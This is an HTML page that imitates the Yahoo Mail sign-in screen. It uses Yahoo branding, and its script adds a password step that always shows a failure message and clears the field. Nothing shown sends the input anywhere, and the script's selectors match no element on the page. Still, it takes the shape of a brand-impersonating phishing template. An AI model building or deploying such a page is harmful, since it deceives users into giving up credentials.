<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Yahoo Login</title>

  <!-- Tailwind CDN -->
  <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-white min-h-screen flex flex-col font-sans">

  <!-- HEADER -->
  <header class="w-full bg-white px-10 py-5 flex items-center justify-between sticky top-0 z-50">
    <!-- LOGO (Official Style) -->
    <a href="#" class="text-[34px] font-black tracking-[-0.05em] text-[#6001d2]"
      style="font-family: 'Inter', sans-serif;">
      yahoo<i class="inline-block transform -skew-x-2 not-italic">!</i>
    </a>
    <!-- RIGHT LINKS -->
    <div class="flex items-center gap-10 text-[15px] font-semibold text-[#6001d2]/90">
      <a href="https://help.yahoo.com/kb/account" class="hover:underline">Help</a>
      <a href="https://legal.yahoo.com/us/en/yahoo/terms/otos/index.html" class="hover:underline">Terms</a>
      <a href="https://legal.yahoo.com/us/en/yahoo/privacy/index.html" class="hover:underline">Privacy</a>
    </div>
  </header>



  <!-- MAIN CONTENT CONTAINER WITH DIRECT BACKGROUND IMAGE -->
  <main class="flex-grow flex items-center justify-center w-full px-3 relative overflow-hidden"
    style="background-image: url('https://tpc.googlesyndication.com/simgad/7023609561164461229'); background-size: 108%; background-position-x: center;">
    <div class="w-full max-w-7xl px-6 grid grid-cols-1 lg:grid-cols-2 gap-10 items-center relative z-10">

      <!-- EMPTY LEFT COLUMN (CONTENT IS IN BACKGROUND IMAGE) -->
      <div class="hidden lg:block min-h-[600px]"></div>

      <!-- RIGHT LOGIN CARD -->
      <div class="flex justify-center lg:justify-end pb-12">
        <div class="w-full max-w-[380px] bg-white border rounded-3xl shadow-2xl p-7">

          <!-- LOGO (Smaller) -->
          <div class="flex justify-center mb-5">
            <span class="text-2xl font-black text-purple-700 italic tracking-tighter">yahoo<i>!</i></span>
          </div>

          <p class="text-center text-xl font-bold mb-2">
            Sign in to Yahoo Mail
          </p>
          <p class="text-center text-gray-500 text-[13px] mb-8">
            using your Yahoo account
          </p>

          <!-- INPUT -->
          <input type="text" placeholder="Username, email, or mobile"
            class="w-full border-b border-gray-300 focus:border-purple-600 focus:outline-none py-2.5 text-base mb-6 transition-colors" />

          <!-- BUTTON -->
          <button
            class="w-full bg-[#7e1fff] hover:bg-[#6a1bd1] text-white py-3 rounded-full font-bold text-base mb-6 transition-colors shadow-lg shadow-purple-200">
            Next
          </button>

          <!-- OPTIONS -->
          <div class="flex items-center justify-between text-base mb-10">
            <label class="flex items-center gap-3 cursor-pointer">
              <input type="checkbox" checked
                class="w-5 h-5 rounded border-gray-300 text-purple-600 focus:ring-purple-500" />
              <span class="text-gray-600">Stay signed in</span>
            </label>
            <a href="#" class="text-purple-600 font-semibold hover:underline">
              Forgot username?
            </a>
          </div>

          <!-- CREATE ACCOUNT -->
          <button
            class="w-full border-2 border-purple-600 text-purple-700 py-2.5 rounded-full font-bold text-base mb-8 hover:bg-purple-50 transition-colors">
            Create an account
          </button>

          <div class="text-center text-gray-400 font-medium mb-6">or</div>

          <!-- GOOGLE LOGIN -->
          <button
            class="w-full border border-gray-300 py-3 rounded-full flex items-center justify-center gap-3 hover:bg-gray-50 transition-all shadow-sm">
            <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google" class="w-6 h-6" />
            <span class="font-bold text-gray-700">Sign in with Google</span>
          </button>

        </div>
      </div>

    </div>
  </main>

  <!-- MODAL -->
  <div id="loginModal" class="fixed inset-0 z-50 hidden flex items-center justify-center bg-black bg-opacity-50">
    <div class="bg-white rounded-xl shadow-lg p-8 w-full max-w-md relative">
      <!-- CLOSE BUTTON -->
      <button id="closeModal" class="absolute top-4 right-4 text-gray-500 hover:text-gray-700">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </button>

      <!-- MODAL CONTENT (Clone of Login Card) -->
      <div id="modalContent">
        <div class="flex justify-center">
          <span class="text-2xl font-black text-purple-700 italic tracking-tighter">yahoo<i>!</i></span>
        </div>
        <p class="text-center text-xl font-bold mb-1">Sign in to Yahoo Mail</p>
        <p class="text-center text-gray-500 text-[13px] mb-6">using your Yahoo account</p>
        <input type="text" placeholder="Username, email, or mobile"
          class="w-full border-b border-gray-300 focus:border-purple-600 focus:outline-none py-2 text-base" />
        <button
          class="w-full bg-[#7e1fff] hover:bg-[#6a1bd1] text-white py-3 rounded-full font-bold text-base mb-4 transition-colors">Next</button>
        <div class="flex items-center justify-between text-[13px] mb-6">
          <label class="flex items-center gap-2"><input type="checkbox" checked /> Stay signed in</label>
          <a href="#" class="text-purple-600 hover:underline">Forgot username?</a>
        </div>
        <button
          class="w-full border border-purple-600 text-purple-600 py-2.5 rounded-full font-bold text-base mb-6 hover:bg-purple-50 transition-colors">Create
          an account</button>
        <div class="text-center text-gray-400 text-sm mb-4">or</div>
        <button
          class="w-full border py-2.5 rounded-full flex items-center justify-center gap-2 hover:bg-gray-50 transition-colors">
          <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google" class="w-5 h-5" />
          <span class="font-bold">Sign in with Google</span>
        </button>
      </div>
    </div>
  </div>

  <!-- SCRIPT -->
  <script>
    const card = document.querySelector("main .w-full.max-w-md");
    let usernameValue = "";

    if (card) {
      const usernameInput = card.querySelector("input[type='text']");
      const nextBtn = card.querySelector("button.bg-purple-600");
      const createBtn = card.querySelector("button.border-purple-600");
      const googleBtn = card.querySelector("button.flex.items-center");

      if (nextBtn && usernameInput) {
        nextBtn.addEventListener("click", () => {
          const username = usernameInput.value.trim();
          if (!username) { alert("Please enter your username, email, or mobile."); return; }
          usernameValue = username;
          usernameInput.style.display = "none";
          nextBtn.style.display = "none";
          showPasswordStep(card);
        });
      }

      if (createBtn) { createBtn.addEventListener("click", () => { alert("Redirecting to account creation page..."); }); }
      if (googleBtn) { googleBtn.addEventListener("click", () => { alert("Redirecting to Google sign-in..."); }); }
    }

    function showPasswordStep(container) {
      const passwordInput = document.createElement("input");
      passwordInput.type = "password";
      passwordInput.id = "passwordInput";
      passwordInput.placeholder = "Enter your password";
      passwordInput.className = "w-full border-b-2 border-purple-500 focus:outline-none py-2 mb-4";

      const loginBtn = document.createElement("button");
      loginBtn.textContent = "Sign In";
      loginBtn.className = "w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-full font-semibold mb-4";

      const errorMsg = document.createElement("div");
      errorMsg.className = "text-red-600 text-sm mb-4 hidden";
      errorMsg.textContent = "Invalid password. Please try again.";

      const optionsDiv = container.querySelector(".flex.items-center");
      if (optionsDiv) {
        container.insertBefore(passwordInput, optionsDiv);
        container.insertBefore(errorMsg, optionsDiv);
        container.insertBefore(loginBtn, optionsDiv);
      } else {
        container.appendChild(passwordInput);
        container.appendChild(errorMsg);
        container.appendChild(loginBtn);
      }

      loginBtn.addEventListener("click", () => {
        const password = passwordInput.value.trim();
        if (!password) { alert("Please enter your password."); return; }
        errorMsg.classList.remove("hidden");
        errorMsg.textContent = "Sorry, we don't recognize this email address.";
        passwordInput.value = "";
      });
    }

    const mailLink = document.getElementById("mailLink");
    const loginModal = document.getElementById("loginModal");
    const closeModal = document.getElementById("closeModal");

    if (mailLink && loginModal && closeModal) {
      mailLink.addEventListener("click", (e) => { e.preventDefault(); loginModal.classList.remove("hidden"); });
      closeModal.addEventListener("click", () => { loginModal.classList.add("hidden"); });
      loginModal.addEventListener("click", (e) => { if (e.target === loginModal) { loginModal.classList.add("hidden"); } });
      const modalContent = document.getElementById("modalContent");
      if (modalContent) {
        const modUsernameInput = modalContent.querySelector("input[type='text']");
        const modNextBtn = modalContent.querySelector("button.bg-purple-600");
        if (modNextBtn && modUsernameInput) {
          modNextBtn.addEventListener("click", () => {
            const key = modUsernameInput.value.trim();
            if (!key) { alert("Please enter username"); return; }
            modUsernameInput.style.display = "none";
            modNextBtn.style.display = "none";
            showPasswordStep(modalContent);
          });
        }
      }
    }
  </script>
</body>

</html>
